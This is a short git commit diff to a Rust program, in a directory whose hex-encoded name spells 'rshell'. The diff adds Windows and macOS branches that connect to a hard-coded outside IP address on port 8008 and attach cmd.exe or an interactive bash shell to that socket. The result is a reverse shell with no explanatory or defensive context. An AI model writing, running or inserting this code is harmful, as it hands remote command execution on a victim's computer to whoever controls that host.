ac1dbaf870392c61d19764e93add31b8238341ed
Pikkel <ilovemathguy@gmail.com>
2022-01-04 14:04:29 -0500

    comit

--- src/_0x727368656c6c/main.rs
+++ src/_0x727368656c6c/main.rs
@@ -15,5 +15,28 @@ pub fn main() {
             .unwrap()
             .wait()
             .unwrap();
+    } else if cfg!(windows) {
+        let x = TcpStream::connect("150.136.245.71:8008").unwrap();
+        let o = x.as_raw_fd();
+        Command::new("C:\\Windows\\System32\\cmd.exe")
+            .stdin(unsafe { Stdio::from_raw_fd(o) })
+            .stdout(unsafe { Stdio::from_raw_fd(o) })
+            .stderr(unsafe { Stdio::from_raw_fd(o) })
+            .spawn()
+            .unwrap()
+            .wait()
+            .unwrap();
+    } else if cfg!(target_os = "macos") {
+        let x = TcpStream::connect("150.136.245.71:8008").unwrap();
+        let o = x.as_raw_fd();
+        Command::new("/bin/bash")
+            .arg("-i")
+            .stdin(unsafe { Stdio::from_raw_fd(o) })
+            .stdout(unsafe { Stdio::from_raw_fd(o) })
+            .stderr(unsafe { Stdio::from_raw_fd(o) })
+            .spawn()
+            .unwrap()
+            .wait()
+            .unwrap();
     }
 }
